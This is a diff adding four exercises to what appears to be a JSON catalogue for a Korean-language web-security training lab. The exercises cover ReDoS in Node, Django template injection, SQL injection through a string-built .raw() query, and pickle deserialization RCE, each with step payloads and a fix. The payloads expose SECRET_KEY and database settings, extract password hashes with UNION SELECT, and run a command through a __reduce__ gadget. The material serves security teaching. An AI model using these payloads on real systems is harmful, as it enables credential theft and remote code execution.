@@ -923,6 +923,98 @@
         }
       ],
       "fix": "phpinfo() 등 진단 페이지를 운영에서 제거/차단."
+    },
+    {
+      "id": 45,
+      "category": "adv",
+      "difficulty": "medium",
+      "engine": "node",
+      "title": "ReDoS — 정규식 서비스 거부 (Node 전용)",
+      "owasp": "A06:2021 Vulnerable and Outdated Components",
+      "ref": "https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS",
+      "goal": "치명적 백트래킹을 유발하는 정규식에 악성 입력을 넣어 단일 스레드 이벤트 루프를 수 초간 블로킹한다.",
+      "route": "/api/validate?value=",
+      "steps": [
+        {
+          "desc": "정상 입력은 즉시 응답(elapsed_ms 작음)",
+          "payload": "/api/validate?value=aaaaaaaa"
+        },
+        {
+          "desc": "앞은 a 반복, 끝에 불일치 문자(!) → elapsed_ms 폭증(이벤트 루프 블로킹)",
+          "payload": "/api/validate?value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"
+        }
+      ],
+      "fix": "백트래킹 없는 정규식, 입력 길이 제한, RE2 등 선형 엔진, 검증 타임아웃."
+    },
+    {
+      "id": 46,
+      "category": "adv",
+      "difficulty": "hard",
+      "engine": "django",
+      "title": "서버측 템플릿 인젝션 — SSTI (Django 전용)",
+      "owasp": "A03:2021 Injection",
+      "ref": "https://portswigger.net/web-security/server-side-template-injection",
+      "goal": "사용자 입력을 Django Template 로 렌더해 컨텍스트의 settings 로 SECRET_KEY·DB 설정을 노출한다.",
+      "route": "/render?tpl=",
+      "steps": [
+        {
+          "desc": "표현식 평가 확인",
+          "payload": "/render?tpl={{ 7|add:\"7\" }}"
+        },
+        {
+          "desc": "시크릿 키 노출",
+          "payload": "/render?tpl={{ settings.SECRET_KEY }}"
+        },
+        {
+          "desc": "DB 자격증명 노출",
+          "payload": "/render?tpl={{ settings.DATABASES }}"
+        }
+      ],
+      "fix": "사용자 입력을 템플릿으로 렌더하지 말 것. 고정 템플릿+이스케이프 컨텍스트만 사용, settings 를 컨텍스트에 넣지 않음."
+    },
+    {
+      "id": 47,
+      "category": "sqli",
+      "difficulty": "medium",
+      "engine": "django",
+      "title": "SQL Injection — .raw() 문자열 조립 (Django 전용)",
+      "owasp": "A03:2021 Injection",
+      "ref": "https://docs.djangoproject.com/en/stable/topics/security/#sql-injection-protection",
+      "goal": "ORM 대신 문자열로 조립한 .raw() 쿼리에서 주입으로 전체 계정을 추출한다. 기본 로그인은 ORM 이라 admin'-- 가 안 통하지만 이 엔드포인트는 취약하다.",
+      "route": "/search_raw?q=",
+      "steps": [
+        {
+          "desc": "항상 참 → 전체 사용자 노출",
+          "payload": "/search_raw?q=' OR '1'='1' -- "
+        },
+        {
+          "desc": "UNION 으로 password 해시 추출(PostgreSQL)",
+          "payload": "/search_raw?q=x' UNION SELECT id,username,password FROM auth_user -- "
+        }
+      ],
+      "fix": "파라미터화 .raw(sql,[params]) 또는 ORM 사용. 문자열 포매팅으로 SQL 조립 금지."
+    },
+    {
+      "id": 48,
+      "category": "adv",
+      "difficulty": "expert",
+      "engine": "django",
+      "title": "안전하지 않은 역직렬화 — Pickle RCE (Django 전용)",
+      "owasp": "A08:2021 Software and Data Integrity Failures",
+      "ref": "https://docs.python.org/3/library/pickle.html",
+      "goal": "신뢰 불가 base64(pickle) 를 pickle.loads 로 복원해 __reduce__ 가젯으로 명령을 실행한다.",
+      "route": "/api/load (POST data=)",
+      "steps": [
+        {
+          "desc": "로컬에서 가젯 pickle 생성 → base64 (예제 파일 pickle-rce.txt 참고)",
+          "payload": "class E:\n  def __reduce__(self): return (__import__('os').system,('id',))"
+        },
+        {
+          "desc": "base64(pickle.dumps(E())) 를 data 로 POST",
+          "payload": "curl -X POST -d \"data=<base64>\" http://127.0.0.1:8103/api/load"
+        }
+      ],
+      "fix": "신뢰 불가 데이터에 pickle 금지. JSON 등 안전 포맷, 서명/검증, 세션 시리얼라이저 JSON."
     }
   ]
 }
